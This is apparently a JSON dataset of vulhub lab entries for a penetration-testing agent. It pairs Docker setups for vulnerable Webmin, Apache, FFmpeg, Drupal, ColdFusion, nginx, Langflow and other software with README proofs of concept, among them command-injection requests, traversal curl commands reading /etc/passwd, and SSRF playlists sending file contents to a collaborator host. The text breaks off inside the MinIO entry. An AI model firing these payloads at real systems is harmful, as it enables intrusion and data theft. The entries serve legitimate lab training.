[
  {
    "filename": "CVE-2019-15107.md",
    "filenamenomd": "CVE-2019-15107",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/webmin/CVE-2019-15107/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/webmin/CVE-2019-15107/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 89 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/webmin:1.910\n   ports:\n    - \"10000:10000\"\n\n```\n\n",
    "readme": "# Webmin Pre-Auth Remote Code Execution (CVE-2019-15107)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nWebmin is a web-based system configuration tool for Unix-like systems. The vulnerability exists in the password reset page, which allows unauthenticated users to execute arbitrary commands through a simple POST request.\n\nReferrers:\n\n- https://www.pentest.com.tr/exploits/DEFCON-Webmin-1920-Unauthenticated-Remote-Command-Execution.html\n- https://www.exploit-db.com/exploits/47230\n- https://blog.firosolutions.com/exploits/webmin/\n\n## Start Vulnerability Application\n\nStart a vulnerable Webmin 1.910 through following command:\n\n```\ndocker compose up -d\n```\n\nAfter the environment is started, you can see the login page of Webmin at `https://your-ip:10000`.\n\n## Vulnerability Reproduce\n\nThe payload of the reference links is incomplete. After reading the code in depth, I found that command can be executed only if the user parameter of the body doesn't exist before 1.920, upon 1.920, no limit.\n\nIn short, sending a following POST request to execute command `id`:\n\n```\nPOST /password_change.cgi HTTP/1.1\nHost: your-ip:10000\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\nConnection: close\nCookie: redirect=1; testing=1; sid=x; sessiontest=1\nReferer: https://your-ip:10000/session_login.cgi\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 60\n\nuser=rootxx&pam=&expired=2&old=test|id&new1=test2&new2=test2\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2022-0778.md",
    "filenamenomd": "CVE-2022-0778",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2022-0778/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/openssl/CVE-2022-0778/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 102 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n  curl:\n    image: vulhub/openssl:1.1.1m-with-curl\n    command: sleep infinity\n\n```\n\n",
    "readme": "# OpenSSL Infinite Loop Leads to DoS (CVE-2022-0778)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nOpenSSL is a software library for applications that secure communications over computer networks against eavesdropping or need to identify the party at the other end.\n\nA flaw was found in OpenSSL. It is possible to trigger an infinite loop by crafting a certificate that has invalid elliptic curve parameters. Since certificate parsing happens before verification of the certificate signature, any process that parses an externally supplied certificate may be subject to a denial of service attack.\n\nReference links:\n\n- <https://github.com/drago-96/CVE-2022-0778>\n- <https://www.cnblogs.com/logchen/p/16030515.html>\n- <https://catbro666.github.io/posts/83951100/>\n- <https://github.com/yywing/cve-2022-0778>\n\n## Vulnerability environment\n\nExecute following command to start a server:\n\n```\ndocker compose up -d\n```\n\n## Reproduce vulnerability\n\nFirstly, use [this project](https://github.com/vulhub/cve-2022-0778) to build and run an evil server. If you don't have the Golang compiler, just use the Docker image:\n\n```\ndocker run -it --rm -p 12345:12345 yywing/cve-2022-0778 --addr 0.0.0.0:12345\n```\n\nThen you can monitor the CPU usage inside the container through `top`:\n\n```\ndocker compose exec curl top\n```\n\nThis vulnerability is available when parsing the certificate, so we can use the cURL to demonstrate it.\n\nEntry the environment, and use the cURL to browse the evil server that started before:\n\n```\ndocker compose exec curl bash\ncurl -k https://host.docker.internal:12345\n```\n\nAt this point, cURL will be caught in an infinite loop, and CPU resources will be exhausted unexpectedly:\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2016-1897.md",
    "filenamenomd": "CVE-2016-1897",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/ffmpeg/CVE-2016-1897/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/ffmpeg/CVE-2016-1897/www/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ffmpeg/CVE-2016-1897/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 190 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/ffmpeg:2.8.4-with-php\n   command: php -S 0.0.0.0:8080 -t /var/www/html\n   volumes:\n    - ./www/index.php:/var/www/html/index.php\n   ports:\n    - \"8080:8080\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/ffmpeg/CVE-2016-1897/www/index.php\n\n- Extension: .php\n- Language: php\n- Size: 676 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nerror_reporting(-1);\nini_set('display_errors', 1);\nif(!empty($_FILES)) {\n    $filename = escapeshellarg($_FILES['file']['tmp_name']);\n    $newname = './' . uniqid() . '.mp4';\n    shell_exec(\"timeout -k 2s 10s ffmpeg -i $filename $newname\");\n}\n?>\n<html>\n <head>\n  <meta charset=\"utf-8\">\n  <title>Video Player</title>\n </head>\n <body>\n     <?php if(!empty($_FILES)): ?>\n     <div>\n        <video src=\"<?=$newname?>\" controls=\"controls\" width=\"640\" height=\"480\"></video>\n     </div>\n     <?php endif; ?>\n     <form method=\"post\" enctype=\"multipart/form-data\">\n       <input type=\"file\" name=\"file\">\n       <input type=\"submit\" value=\"Submit\">\n     </form>\n </body>\n</html>\n\n```\n\n",
    "readme": "# FFmpeg Arbitrary File Read and SSRF (CVE-2016-1897/CVE-2016-1898)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nFFmpeg is a popular multimedia framework that can handle various audio and video formats. In the FFmpeg version prior to 2.8.5, 2.7.5, 2.6.7, 2.5.10, 2.4.13, two vulnerabilities were discovered that could allow attackers to read arbitrary files (CVE-2016-1897) or perform Server-Side Request Forgery (SSRF) attacks (CVE-2016-1898).\n\nReferences:\n\n- <https://tttang.com/archive/465/>\n- <http://habrahabr.ru/company/mailru/blog/274855/>\n- <http://xdxd.love/2016/01/18/ffmpeg-SSRF%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/>\n\n## Environment Setup\n\nExecute the following commands to build and start the environment:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, it will listen on port 8080. Visit `http://your-ip:8080/` to access the application, the application is a simple video player that allows users to upload and play videos.\n\n## Vulnerability Reproduction\n\nUpload the following poc to reproduce the SSRF vulnerability using collaborator server:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nhttp://collaborator/ssrf\n#EXT-X-ENDLIST\n```\n\nAs you can see, the collaborator server will receive the request:\n\n![](1.png)\n\nTo reproduce the arbitrary file reading, you should serve a intermediate file on an accessible server (for example, `http://intermediate.example.com/intermediate.m3u8`) with following content:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:,\nhttp://collaborator/fileread?\n```\n\nThe content of the files you stole will be sent to the collaborator server specified in the intermediary file above.\n\nThen, use the intermediate file to construct the POC and upload it:\n\n```\n#EXTM3U\n#EXT-X-MEDIA-SEQUENCE:0\n#EXTINF:10.0,\nconcat:http://intermediate.example.com/intermediate.m3u8|subfile,,start,0,end,31,,:file:///etc/passwd|subfile,,start,32,end,63,,:file:///etc/passwd|subfile,,start,64,end,95,,:file:///etc/passwd|subfile,,start,96,end,127,,:file:///etc/passwd|subfile,,start,127,end,158,,:file:///etc/passwd\n#EXT-X-ENDLIST\n```\n\nAs you can see, the collaborator server will receive the request that contains the content of `/etc/passwd`:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2021-42013.md",
    "filenamenomd": "CVE-2021-42013",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-42013/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-42013/Dockerfile\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-42013/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 70 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n apache:\n   build: .\n   ports:\n    - \"8080:80\"\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/httpd/CVE-2021-42013/Dockerfile\n\n- Extension: \n- Language: unknown\n- Size: 838 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```unknown\nFROM vulhub/httpd:2.4.50\n\nLABEL maintainer=\"phithon <root@leavesongs.com>\"\n\nRUN set -ex \\\n    && sed -i \"s|#LoadModule cgid_module modules/mod_cgid.so|LoadModule cgid_module modules/mod_cgid.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#LoadModule cgi_module modules/mod_cgi.so|LoadModule cgi_module modules/mod_cgi.so|g\" /usr/local/apache2/conf/httpd.conf \\\n    && sed -i \"s|#Include conf/extra/httpd-autoindex.conf|Include conf/extra/httpd-autoindex.conf|g\" /usr/local/apache2/conf/httpd.conf \\\n    && cat /usr/local/apache2/conf/httpd.conf \\\n        | tr '\\n' '\\r' \\\n        | perl -pe 's|<Directory />.*?</Directory>|<Directory />\\n    AllowOverride none\\n    Require all granted\\n</Directory>|isg' \\\n        | tr '\\r' '\\n' \\\n        | tee /tmp/httpd.conf \\\n    && mv /tmp/httpd.conf /usr/local/apache2/conf/httpd.conf\n\n```\n\n",
    "readme": "# Path traversal and file disclosure vulnerability in Apache HTTP Server 2.4.50 (CVE-2021-42013)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nThe Apache HTTP Server Project is an effort to develop and maintain an open-source HTTP server for modern operating systems including UNIX and Windows.\n\nCVE-2021-42013 is a vulnerability that caused by incomplete fix of [CVE-2021-41773](https://github.com/vulhub/vulhub/tree/master/httpd/CVE-2021-41773), an attacker could use a path traversal attack to map URLs to files outside the directories configured by Alias-like directives.\n\nThis vulnerability affects Apache HTTP Server 2.4.49 and 2.4.50 and not earlier versions.\n\nReferences:\n\n- https://httpd.apache.org/security/vulnerabilities_24.html\n- https://twitter.com/roman_soft/status/1446252280597078024\n\n## Vulnerable environment\n\nExecute following commands to start a vulnerable Apache HTTP Server:\n\n```\ndocker compose build\ndocker compose up -d\n```\n\nAfter the server is started, you can see the default page which says `It works!` of Apache HTTP Server through `http://your-ip:8080`.\n\n## Exploit\n\nApache HTTP Server 2.4.50 patched the previous CVE-2021-41773 payload such as `http://your:8080/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd`, but it was incomplete.\n\nUse `.%%32%65` to bypass the patches (Note that `/icons/` must be a existing directory):\n\n```\ncurl -v --path-as-is http://your-ip:8080/icons/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd\n```\n\nThe `/etc/passwd` is disclosured successfully:\n\n![](1.png)\n\nWith the mods cgi or cgid enabled on the server, this path traversal vulnerability would allow arbitrary command execution:\n\n```\ncurl -v --data \"echo;id\" 'http://your-ip:8080/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh'\n```\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2018-7490.md",
    "filenamenomd": "CVE-2018-7490",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/uwsgi/CVE-2018-7490/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/uwsgi/CVE-2018-7490/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 91 bytes\n- Created: 2025-04-26 21:29:54\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '2'\nservices:\n web:\n   image: vulhub/uwsgi-php:2.0.16\n   ports:\n    - \"8080:8080\"\n\n```\n\n",
    "readme": "\n# uWSGI PHP Directory Traversal Vulnerability (CVE-2018-7490)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nuWSGI is a web application server, which implements protocols such as WSGI/uwsgi/http, and supports for various languages through plugins.\n\nThe PHP plugin of uWSGI before 2.0.17 doesn't handle the detection of `DOCUMENT_ROOT` correctly, resulting in reading or running files outside the `DOCUMENT_ROOT` through the use of `..%2f`.\n\n## Environment Setup\n\nEnter the following command：\n\n```\ndocker compose up -d\n```\n\nVisit `http://your-ip:8080` and you'll see the phpinfo page as the uwsgi-php server running successfully.\n\n## POC\n\nDirectly visit `http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd`, you will get the passwd file：\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2017-6920.md",
    "filenamenomd": "CVE-2017-6920",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2017-6920/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/drupal/CVE-2017-6920/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 72 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n web:\n   image: vulhub/drupal:8.3.0\n   ports:\n    - \"8080:80\"\n\n```\n\n",
    "readme": "# Drupal Core 8 PECL YAML Deserialization Remote Code Execution (CVE-2017-6920)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nDrupal is a free and open-source web content management framework written in PHP.\n\nA remote code execution vulnerability exists in Drupal 8.x through 8.3.4 when using the PECL YAML parser. The vulnerability is caused by unsafe deserialization of YAML content, allowing attackers to execute arbitrary code.\n\nReferences:\n\n- <https://www.drupal.org/forum/newsletters/security-advisories-for-drupal-core/2017-06-21/drupal-core-multiple>\n- <https://paper.seebug.org/334/>\n\n## Environment Setup\n\nExecute the following command to start a vulnerable Drupal 8.3.0 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server is started, visit `http://your-ip:8080/` to access the Drupal installation page. Follow the default configuration steps to complete the installation. Since there is no MySQL environment, you can choose SQLite as the database.\n\n## Vulnerability Reproduction\n\nTo reproduce this vulnerability, first log in to the Drupal site with administrator credentials. Once logged in, navigate to the configuration import page at `http://127.0.0.1:8080/admin/config/development/configuration/single/import`.\n\nSelect \"Simple configuration\" for Configuration type, enter any name for Configuration name, and paste the following PoC in \"Paste your configuration here\":\n\n```php\n!php/object \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\0GuzzleHttp\\\\Psr7\\\\FnStream\\0methods\\\";a:1:{s:5:\\\"close\\\";s:7:\\\"phpinfo\\\";}s:9:\\\"_fn_close\\\";s:7:\\\"phpinfo\\\";}\"\n```\n\n![1](1.png)\n\nClick \"Import\" and you will see the vulnerability has been successfully triggered, displaying the phpinfo page:\n\n![2](2.png)\n\n> Note: Although official CPE information indicates this vulnerability exists since version 8.0.0, our testing shows it can only be reproduced in Drupal 8.3.0, not in 8.0.0.\n"
  },
  {
    "filename": "CVE-2023-29300.md",
    "filenamenomd": "CVE-2023-29300",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2023-29300/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/coldfusion/CVE-2023-29300/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 178 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 18:41:15\n\n### Code\n\n```yaml\nservices:\n  coldfusion:\n    image: vulhub/coldfusion:2018.0.15\n    ports:\n      - \"8500:8500\"\n      - \"5005:5005\"\n    environment:\n      - password=vulhub\n      - acceptEULA=YES\n\n```\n\n",
    "readme": "# Adobe ColdFusion XML Deserialization Leads to RCE (CVE-2023-29300)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nAdobe ColdFusion is a commercial rapid web-application development computing platform created by J. J. Allaire in 1995.\n\nAdobe ColdFusion versions 2018 Update 16 (and earlier), 2021 Update 6 (and earlier) and 2023.0.0.330468 (and earlier) are affected by a deserialization of untrusted data vulnerability. Attacker is able to call arbitrary setter function and execute arbitrary commands eventually.\n\nReferences:\n\n- <https://blog.projectdiscovery.io/adobe-coldfusion-rce/>\n- <https://xz.aliyun.com/t/13413>\n\n## Vulnerable environment\n\nStart a Adobe ColdFusion 2018.0.15:\n\n```\ndocker compose up -d\n```\n\nAfter a few minutes wait, visit `http://your-ip:8500/CFIDE/administrator/index.cfm` with password `vulhub`, you can install the Adobe ColdFusion successfully.\n\n## Exploit\n\nTo exploit this issue, you have to find a valid gadget to execute arbitrary code in ColdFusion server. The most common gadget is `com.sun.rowset.JdbcRowSetImpl` that uses the JNDI injection to execute the command.\n\nWe utilize the [Java Chains](https://github.com/vulhub/java-chains) tool for vulnerability reproduction. To get started with Java Chains, please visit the [Quick Start](https://java-chains.vulhub.org/docs/guide) guide.  Then, following the instructions in the screenshot below, generate a payload based on the `CommonsBeanutils1` exploit chain.\n\n![](1.png)\n\nThen, send the following request to ColdFusion server (replace with your LDAP server address):\n\n```\nPOST /CFIDE/adminapi/accessmanager.cfc?method=foo&_cfclient=true HTTP/1.1\nHost: localhost\nAccept-Encoding: gzip, deflate\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36\nCache-Control: max-age=0\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 333\n\nargumentCollection=<wddxPacket version='1.0'><header/><data><struct type='xcom.sun.rowset.JdbcRowSetImplx'><var name='dataSourceName'><string>ldap://your.ldap.server/example</string></var><var name='autoCommit'><boolean value='true'/></var></struct></data></wddxPacket>\n```\n\nAs you can see, the `touch /tmp/success` is executed successfully:\n\n![](2.png)\n"
  },
  {
    "filename": "CVE-2013-4547.md",
    "filenamenomd": "CVE-2013-4547",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/www.conf\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/nginx.conf\n- /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/index.php\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/www.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 112 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ini\n[global]\ndaemonize = no\n\n[www]\nlisten = 9000\nsecurity.limit_extensions = \nphp_admin_flag[cgi.fix_pathinfo] = off\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 476 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n nginx:\n   image: vulhub/nginx:1.4.2\n   volumes:\n    - ./nginx.conf:/usr/local/nginx/conf/nginx.conf\n    - ./index.php:/usr/local/nginx/html/index.php\n   ports:\n    - \"8080:80\"\n php:\n   image: vulhub/php:5.6-fpm\n   command: \n    - bash\n    - -c\n    - \"mkdir -p /var/www/html/uploadfiles && chown -R www-data:www-data /var/www/html/uploadfiles && php-fpm\"\n   volumes:\n    - ./index.php:/var/www/html/index.php\n    - ./www.conf:/usr/local/etc/php-fpm.d/zz-docker.conf\n\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/nginx.conf\n\n- Extension: .conf\n- Language: ini\n- Size: 667 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```ini\nworker_processes  1;\n\nevents {\n    worker_connections  1024;\n}\n\n\nhttp {\n    include       mime.types;\n    default_type  application/octet-stream;\n\n    sendfile        on;\n    keepalive_timeout  65;\n\n    server {\n        listen       80;\n        server_name  localhost;\n        root   html;\n        index  index.php;\n\n        charset utf-8;\n\n        location ~ \\.php$ {\n           root           html;\n           include        fastcgi_params;\n\n           fastcgi_pass   php:9000;\n           fastcgi_index  index.php;\n           fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;\n           fastcgi_param  DOCUMENT_ROOT /var/www/html;\n        }\n    }\n}\n```\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/nginx/CVE-2013-4547/index.php\n\n- Extension: .php\n- Language: php\n- Size: 862 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```php\n<?php\nif (!empty($_FILES)):\n\n// Check for errors\nif($_FILES['file_upload']['error'] > 0){\n    die('An error ocurred when uploading.');\n}\n\n// Check filesize\nif(!is_uploaded_file($_FILES['file_upload']['tmp_name'])) {\n    die('File is not uploaded file');\n}\n\n$ext = pathinfo($_FILES['file_upload']['name'], PATHINFO_EXTENSION);\nif (empty($ext) || in_array($ext, ['php', 'php3', 'php5', 'phtml'])) {\n    die('Unsupported filetype uploaded.');\n}\n\n$new_name = __DIR__ . '/uploadfiles/' . $_FILES['file_upload']['name'];\nif(!move_uploaded_file($_FILES['file_upload']['tmp_name'], $new_name)){\n    die('Error uploading file - check destination is writeable.');\n}\n\ndie('File uploaded successfully: ' . $new_name);\n\nelse:\n?>\n<form method=\"post\" enctype=\"multipart/form-data\">\n    File: <input type=\"file\" name=\"file_upload\">\n    <input type=\"submit\">\n</form>\n<?php\nendif;\n```\n\n",
    "readme": "# Nginx Filename Logic Vulnerability (CVE-2013-4547)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nNginx is a web server that can be used as a reverse proxy, load balancer, mail proxy, and HTTP cache. Nginx 0.8.41 through 1.4.3 and 1.5.x before 1.5.7 allows remote attackers to bypass intended restrictions via an unescaped space character in a URI.\n\nThis vulnerability is not directly related to code execution. The main cause is the incorrect parsing of request URIs, which leads to incorrect retrieval of user-requested filenames, resulting in privilege bypass and code execution as side effects.\n\nFor example, when Nginx matches requests ending with .php, it sends them to fastcgi for parsing. A common configuration looks like this:\n\n```\nlocation ~ \\.php$ {\n    include        fastcgi_params;\n\n    fastcgi_pass   127.0.0.1:9000;\n    fastcgi_index  index.php;\n    fastcgi_param  SCRIPT_FILENAME  /var/www/html$fastcgi_script_name;\n    fastcgi_param  DOCUMENT_ROOT /var/www/html;\n}\n```\n\nUnder normal circumstances (with pathinfo disabled), only files with .php extensions are sent to fastcgi for parsing.\n\nHowever, in the presence of CVE-2013-4547, when we request `1.gif[0x20][0x00].php`, this URI matches the regular expression `\\.php$` and enters this Location block. But after entering, Nginx incorrectly identifies the requested file as `1.gif[0x20]` and sets it as the value of `SCRIPT_FILENAME` to send to fastcgi.\n\nFastcgi then parses based on the value of `SCRIPT_FILENAME`, ultimately resulting in a parsing vulnerability. Therefore, we only need to upload a file ending with a space to make PHP parse it.\n\nHere's another example. Many websites restrict backend access to specific IPs:\n\n```\nlocation /admin/ {\n    allow 127.0.0.1;\n    deny all;\n}\n```\n\nWe can request the following URI: `/test[0x20]/../admin/index.php`. This URI won't match the location pattern `/admin/`, thus bypassing the IP verification. However, the actual requested file is `/test[0x20]/../admin/index.php`, which resolves to `/admin/index.php`, successfully accessing the backend. (This requires having a directory called \"test \": this is a Linux system feature. If a directory doesn't exist, even when jumping to the parent directory, it will throw a file not found error. Windows doesn't have this restriction)\n\nReferences:\n\n - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-4547\n - https://blog.werner.wiki/file-resolution-vulnerability-nginx/\n - http://www.91ri.org/9064.html\n\n## Environment Setup\n\nRun the following command to start a Nginx server 1.4.2:\n\n```\ndocker compose up -d\n```\n\nAfter the environment starts, visit `http://your-ip:8080/` to see an upload page.\n\n## Vulnerability Reproduce\n\nThis server uses blacklist validation, and we cannot upload files with .php extensions. We need to exploit CVE-2013-4547. We upload a \"1.gif \" (note the space at the end):\n\n![](01.png)\n\nVisit `http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php`, and you'll find that PHP has been parsed:\n\n![](02.png)\n\nNote: [0x20] is a space, [0x00] is `\\0`, and these characters don't need to be encoded.\n"
  },
  {
    "filename": "CVE-2025-3248.md",
    "filenamenomd": "CVE-2025-3248",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/langflow/CVE-2025-3248/docker-compose.yml\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/langflow/CVE-2025-3248/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 303 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nservices:\n  web:\n    image: vulhub/langflow:1.2.0\n    ports:\n      - 7860:7860\n    environment:\n      - LANGFLOW_HOST=0.0.0.0\n      - LANGFLOW_AUTO_LOGIN=false\n      - LANGFLOW_SUPERUSER=administrator\n      - LANGFLOW_SUPERUSER_PASSWORD=vulhub\n      - DO_NOT_TRACK=true\n      - GIT_PYTHON_REFRESH=quiet\n\n```\n\n",
    "readme": "# Langflow `validate/code` API Pre-Auth Remote Code Execution (CVE-2025-3248)\n\n[中文版本(Chinese version)](README.zh-cn.md)\n\nLangflow is a popular open-source tool for building agentic AI workflows, providing a Python-based web interface to visually construct AI-driven agents and pipelines.\n\nA critical unauthenticated remote code execution vulnerability (CVE-2025-3248) exists in Langflow prior to version 1.3.0. An vulnerable endpoint (`/api/v1/validate/code`) attempts to validate user-submitted Python code by parsing it with the `ast` module and executing any function definitions using `exec`. However, Python decorators and default argument expressions are also executed at function definition time, making it possible to inject arbitrary code via these features.\n\nAttackers can exploit this issue by sending a specially crafted function definition with a malicious decorator or default argument, resulting in code execution as the server user.\n\nReferences:\n\n- <https://horizon3.ai/attack-research/disclosures/unsafe-at-any-speed-abusing-python-exec-for-unauth-rce-in-langflow-ai/>\n- <https://github.com/langflow-ai/langflow/releases/tag/1.3.0>\n- <https://github.com/langflow-ai/langflow/pull/6911>\n\n## Environment Setup\n\nExecute the following command to start a Langflow 1.2.0 server:\n\n```\ndocker compose up -d\n```\n\nAfter the server starts, the Langflow web interface will be available at `http://your-ip:7860`. You can login with the default credentials `administrator:vulhub`.\n\n## Vulnerability Reproduction\n\nTo reproduce the vulnerability, you can send a POST request to the `/api/v1/validate/code` endpoint with a malicious Python function definition. For example, the following payload will execute `id` command on the server using a decorator:\n\n```\nPOST /api/v1/validate/code HTTP/1.1\nHost: your-ip:7860\nAccept-Encoding: gzip, deflate, br\nAccept: */*\nAccept-Language: en-US;q=0.9,en;q=0.8\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36\nConnection: close\nCache-Control: max-age=0\nContent-Type: application/json\nContent-Length: 105\n\n{\"code\": \"@exec(\\\"raise Exception(__import__('subprocess').check_output(['id']))\\\")\\ndef foo():\\n  pass\"}\n```\n\n![](1.png)\n"
  },
  {
    "filename": "CVE-2023-28432.md",
    "filenamenomd": "CVE-2023-28432",
    "filetext": "# Table of Contents\n- /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/docker-compose.yml\n- /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/mnt/data1/.gitignore\n- /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/mnt/data2/.gitignore\n- /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/mnt/data3/.gitignore\n\n## File: /home/yay/pentest-agent/vulhub/sites_no_md/minio/CVE-2023-28432/docker-compose.yml\n\n- Extension: .yml\n- Language: yaml\n- Size: 1208 bytes\n- Created: 2025-04-26 21:29:53\n- Modified: 2025-04-26 17:57:04\n\n### Code\n\n```yaml\nversion: '3'\nservices:\n  node1:\n    image: vulhub/minio:2023-02-27T18-10-45Z\n    environment:\n      - MINIO_ROOT_USER=minioadmin\n      - MINIO_ROOT_PASSWORD=minioadmin-vulhub\n    command:\n      - minio\n      - server\n      - --console-address\n      - :9001\n      - http://node1:9000/mnt/data1\n      - http://node2:9000/mnt/data2\n      - http://node3:9000/mnt/data3\n    ports:\n      - 9000:9000\n      - 9001:9001\n    hostname: node1\n    volumes:\n      - ./mnt/data1:/mnt/data1\n  node2:\n    image: vulhub/minio:2023-02-27T18-10-45Z\n    environment:\n      - MINIO_ROOT_USER=minioadmin\n      - MINIO_ROOT_PASSWORD=minioadmin-vulhub\n    command:\n      - minio\n      - server\n      - http://node1:9000/mnt/data1\n      - http://node2:9000/mnt/data2\n      - http://node3:9000/mnt/data3\n    hostname: node2\n    volumes:\n      - ./mnt/data2:/mnt/data2\n  node3:\n    image: vulhub/minio:2023-02-27T18-10-45Z\n    environment:\n      - MINIO_ROOT_USER=minioadmin\n      - MINIO_ROOT_PASSWORD=minioadmin-vulhub\n    command:\n      - minio\n      - server\n      - http://node1:9000/mnt/data1\n      - http://node2:9000/mnt/data2\n      - http://node3:9000/mnt/data3\n    hostname: node3\n    